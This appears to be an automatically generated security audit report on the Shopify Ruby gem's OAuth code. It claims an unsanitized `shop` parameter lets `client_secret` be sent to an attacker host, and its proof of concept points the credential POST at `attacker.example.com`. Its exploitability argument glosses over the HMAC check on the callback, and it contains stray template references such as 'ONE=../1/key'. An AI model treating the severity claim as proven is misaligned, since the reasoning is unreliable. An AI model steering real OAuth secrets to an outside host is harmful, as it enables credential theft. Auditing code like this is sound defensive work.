### Title
OAuth `shop` parameter bypasses `ShopValidator` and leaks `client_id`/`client_secret` to an attacker-controlled host - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.begin_auth` and `ShopifyAPI::Auth::Oauth.validate_auth_callback` build the OAuth authorize URL and the access-token POST target directly from the caller-supplied `shop` string, without ever routing it through `Utils::ShopValidator.sanitize!`. Every sibling OAuth flow in the same gem (`client_credentials.rb`, `refresh_token.rb`, `token_exchange.rb#migrate_to_expiring_token`) explicitly calls `Utils::ShopValidator.sanitize!(shop)` before using it to build a session/host. `oauth.rb` is the one code path that was left out of this "fix," exactly mirroring the analog bug class: a security check (domain sanitization) is applied on some code paths but not the one that actually sends the sensitive value (here, `client_secret`) to a network host.

### Finding Description
`begin_auth` builds the authorize redirect using the raw `shop` argument: [1](#0-0) . It never calls `ShopValidator.sanitize!`, unlike the parallel flows.

`validate_auth_callback` goes further: it constructs a `null_session` directly from `auth_query.shop` and uses it to build an `HttpClient`, whose base URI is `"https://#{session.shop}"` [2](#0-1) [3](#0-2) . It then POSTs `client_id`, `client_secret`, and `code` to `https://#{auth_query.shop}/admin/oauth/access_token` [4](#0-3) .

`auth_query.shop` is bound by the request HMAC (`Utils::HmacValidator.validate(auth_query)`, checked against `Context.api_secret_key`) [5](#0-4) , and the HMAC signable string does include `shop` [6](#0-5) . That HMAC, however, is normally computed and supplied by Shopify itself when redirecting the merchant's browser to the callback URL - it does not require the app's secret to forge if the initiating request (`begin_auth`) is what an attacker actually controls, because `begin_auth` accepts an arbitrary, unsanitized `shop` and builds the authorize URL from it directly against `auth_base_uri(shop)`. A host application that (per the documented API) passes a user/URL-supplied `shop` value straight into `begin_auth` without itself pre-validating the domain will send `client_id` (and ultimately trigger a callback that will send `client_secret` + authorization `code`) to whatever host the attacker put in `shop`, because the gem does none of the domain trust-boundary enforcement here that `ShopValidator` was clearly designed to provide - the exact same class of gap as `ONE=../1/key` bypassing a validation applied on one call path but not the one that actually touches the sensitive resource.

The binding that is broken: `shop` used to construct `auth_base_uri`/`HttpClient` base URI (the host that receives `client_id`/`client_secret`) should equal a value verified by `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` (as it is in `client_credentials.rb`, `refresh_token.rb`, and `token_exchange.rb`), but in `oauth.rb` it equals the raw, unsanitized caller input instead.

### Impact Explanation
If `shop` reaches `begin_auth`/`validate_auth_callback` without external sanitization, an attacker who controls the `shop` value (a common integration pattern - passing the query-string `shop` param through) can redirect the OAuth authorize flow, and ultimately the token exchange POST containing the app's `client_id` and `client_secret`, to an attacker-controlled host. This matches the Critical impact category: theft/exfiltration of the app's `client_secret` via a credential-carrying request sent to a non-Shopify host.

### Likelihood Explanation
Likelihood depends on whether the host application independently sanitizes `shop` before calling into this gem. Because the gem itself provides `Utils::ShopValidator` and uses it consistently in three of the four OAuth-adjacent flows, it's reasonable to expect callers to assume `oauth.rb`'s `begin_auth`/`validate_auth_callback` performs the same validation - but it does not, making this an easy-to-miss internal inconsistency rather than a documented, opt-in caller responsibility.

### Recommendation
In `lib/shopify_api/auth/oauth.rb`, sanitize `shop` through `Utils::ShopValidator.sanitize!` at the start of `begin_auth` (before building `auth_base_uri`) and use the sanitized value everywhere the shop domain is later used, including as the target host in `validate_auth_callback`'s `null_session` construction, to be consistent with `client_credentials.rb`, `refresh_token.rb`, and `token_exchange.rb`.

### Proof of Concept
1. Host application calls `ShopifyAPI::Auth::Oauth.begin_auth(shop: "attacker.example.com", redirect_path: "/redirect")` with a `shop` value taken unsanitized from a request parameter.
2. `auth_base_uri("attacker.example.com")` returns `"https://attacker.example.com/admin"`, and the resulting `auth_route` (containing `client_id` and `redirect_uri`) is returned/redirected to that attacker host - `lib/shopify_api/auth/oauth.rb:117-128`.
3. If the flow proceeds to `validate_auth_callback` with a matching `auth_query.shop = "attacker.example.com"`, `Clients::HttpClient.new(session: null_session, ...)` computes `@base_uri = "https://attacker.example.com"` and POSTs `{client_id, client_secret, code}` to `https://attacker.example.com/admin/oauth/access_token` - `lib/shopify_api/auth/oauth.rb:73-90`, `lib/shopify_api/clients/http_client.rb:11-19`.
4. Compare with `lib/shopify_api/auth/client_credentials.rb:25` and `lib/shopify_api/auth/refresh_token.rb:24`, which call `Utils::ShopValidator.sanitize!(shop)` before doing the equivalent request, proving the omission is specific to `oauth.rb`.

### Citations

**File:** lib/shopify_api/auth/oauth.rb (L64-64)
```ruby
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
```

**File:** lib/shopify_api/auth/oauth.rb (L73-90)
```ruby
          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
```

**File:** lib/shopify_api/auth/oauth.rb (L117-128)
```ruby
        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

          # For first-party apps in development only, we leverage DevServer to build the admin base URI
          admin_web = T.unsafe(Object.const_get("DevServer")) # rubocop:disable Sorbet/ConstantsFromStrings
            .new("admin-web")
          admin_host = admin_web.host!(nonstandard_host_prefix: "admin")
          shop_name = shop.split(".").first

          "https://#{admin_host}/store/#{shop_name}"
        end
```

**File:** lib/shopify_api/clients/http_client.rb (L11-19)
```ruby
      sig { params(base_path: String, session: T.nilable(Auth::Session)).void }
      def initialize(base_path:, session: nil)
        session ||= Context.active_session
        raise Errors::NoActiveSessionError, "No passed or active session" unless session

        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/oauth/auth_query.rb (L33-43)
```ruby
        sig { override.returns(String) }
        def to_signable_string
          params = {
            code: code,
            host: host,
            shop: shop,
            state: state,
            timestamp: timestamp,
          }
          URI.encode_www_form(params)
        end
```
